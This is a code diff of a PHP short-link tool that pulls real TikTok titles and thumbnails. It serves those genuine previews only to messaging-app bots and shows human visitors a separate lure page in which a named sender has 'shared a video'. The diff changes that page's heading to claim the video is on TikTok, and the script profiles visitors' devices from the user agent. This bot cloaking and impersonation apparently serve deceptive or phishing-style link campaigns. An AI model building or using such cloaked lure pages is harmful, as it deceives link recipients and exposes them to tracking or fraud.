@@ -40,14 +40,12 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة مخصصة ومركزة حصرياً لسحب العنوان والصورة المصغرة الحقيقية من تيك توك
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
-    // استدعاء واجهة oEmbed الخاصة بتيك توك لجلب العنوان والصورة الأصلية بدقة متناهية
     $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $oembed_url);
@@ -69,7 +67,6 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
 
-    // الطريقة البديلة في حال كان الرابط مختصراً جداً ولم يستجب الـ oEmbed مباشرة
     $ch_alt = curl_init();
     curl_setopt($ch_alt, CURLOPT_URL, $url);
     curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
@@ -138,7 +135,6 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
-// معالجة زيارة الرابط
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -156,7 +152,6 @@ if (isset($_GET['r'])) {
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
-        // إرسال وسوم المعاينة الأصلية المباشرة لروبوتات التطبيقات (مثل ماسنجر)
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
@@ -316,7 +311,7 @@ if (isset($_GET['r'])) {
         <div class="avatar-container">
             <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
         </div>
-        <h2>Watch this video</h2>
+        <h2>Watch this video on TikTok</h2>
         <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
         <button class="btn-action">Watch Now</button>
         <button class="btn-secondary">Not now</button>
@@ -330,7 +325,6 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء الرابط وسحب بيانات تيك توك حصرياً
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
